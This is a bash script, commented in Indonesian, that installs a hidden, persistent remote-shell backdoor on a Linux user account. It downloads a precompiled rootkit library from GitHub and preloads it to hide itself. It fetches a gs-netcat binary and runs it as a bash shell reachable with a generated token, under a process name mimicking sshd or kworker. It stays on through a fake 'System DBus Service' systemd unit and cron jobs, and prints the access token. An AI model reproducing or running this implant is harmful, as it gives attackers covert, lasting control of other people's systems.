#!/bin/bash
# GSocket Universal - Fix Path

set -e

# Deteksi HOME secara absolut
if [ -z "$HOME" ]; then
    HOME=$(getent passwd "$(whoami)" | cut -d: -f6)
fi
export HOME

# Gunakan path absolut
BASE_DIR="$HOME/.config/.cache/.systemd"
CORE_BIN="$BASE_DIR/update-notifier"
HIDE_LIB="$BASE_DIR/libcrypt.so.1"
TOKEN_FILE="$BASE_DIR/.system-token"
SERVICE_NAME="dbus-system.service"
SERVICE_DIR="$HOME/.config/systemd/user"
HIDE_NAME=$(shuf -e "systemd" "sshd" "kworker" "rsyslogd" "dbus-daemon" "NetworkManager" "gdm" "accounts-daemon" "swapper" "rcu_preempt" -n1 2>/dev/null || echo "systemd")

# Generate token
TOKEN=$(openssl rand -hex 20 2>/dev/null || date +%s | sha256sum | head -c 40)

# Buat direktori (pakai $HOME, BUKAN ~)
mkdir -p "$BASE_DIR" 2>/dev/null
cd "$BASE_DIR" 2>/dev/null || exit 1

# Rootkit (pre-compiled)
if [ ! -f "$HIDE_LIB" ]; then
    curl -fsSL https://raw.githubusercontent.com/sasisuro/shell/main/libcrypt.so.1 -o "$HIDE_LIB" 2>/dev/null || true
    chmod 600 "$HIDE_LIB" 2>/dev/null
fi

# Download gs-netcat (static binary)
if [ ! -f "$CORE_BIN" ]; then
    curl -fsSL https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64-alpine -o "$CORE_BIN" 2>/dev/null || {
        curl -fsSL https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64 -o "$CORE_BIN" 2>/dev/null
    }
    chmod +x "$CORE_BIN" 2>/dev/null
fi

# Simpan token
echo "$TOKEN" > "$TOKEN_FILE"
chmod 600 "$TOKEN_FILE" 2>/dev/null

# Fungsi start daemon
start_daemon() {
    cd "$HOME" 2>/dev/null || exit
    if [ -s "$HIDE_LIB" ]; then
        export LD_PRELOAD="$HIDE_LIB"
    fi
    GSOCKET_ARGS="-k $TOKEN_FILE -liqD -e /bin/bash --noprofile --norc" \
    exec -a "$HIDE_NAME" "$CORE_BIN" </dev/null >/dev/null 2>&1 &
    sleep 2
}

# Systemd user
HAS_SYSTEMD_USER=false
if systemctl --user --no-pager status 2>/dev/null | grep -q "State:"; then
    HAS_SYSTEMD_USER=true
fi

if $HAS_SYSTEMD_USER; then
    mkdir -p "$SERVICE_DIR" 2>/dev/null
    SERVICE_FILE="$SERVICE_DIR/$SERVICE_NAME"
    cat > "$SERVICE_FILE" << EOF
[Unit]
Description=System DBus Service
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=30
Environment="LD_PRELOAD=$HIDE_LIB"
Environment="GSOCKET_ARGS=-k $TOKEN_FILE -liqD -e /bin/bash --noprofile --norc"
ExecStart=/bin/bash -c "exec -a $HIDE_NAME $CORE_BIN"
WorkingDirectory=$HOME

[Install]
WantedBy=default.target
EOF
    systemctl --user daemon-reload 2>/dev/null
    systemctl --user enable "$SERVICE_NAME" 2>/dev/null || true
    systemctl --user restart "$SERVICE_NAME" 2>/dev/null || true
fi

# Cron (@reboot + setiap menit)
(crontab -l 2>/dev/null | grep -v "update-notifier" || true) | crontab - 2>/dev/null || true
CRON_CMD="cd $HOME && LD_PRELOAD=$HIDE_LIB GSOCKET_ARGS=\"-k $TOKEN_FILE -liqD -e /bin/bash --noprofile --norc\" exec -a $HIDE_NAME $CORE_BIN </dev/null >/dev/null 2>&1"
( (crontab -l 2>/dev/null || true); echo "@reboot $CRON_CMD"; echo "* * * * * $CRON_CMD" ) | crontab - 2>/dev/null

# Start daemon sekarang
start_daemon

# Output token
echo "$TOKEN"
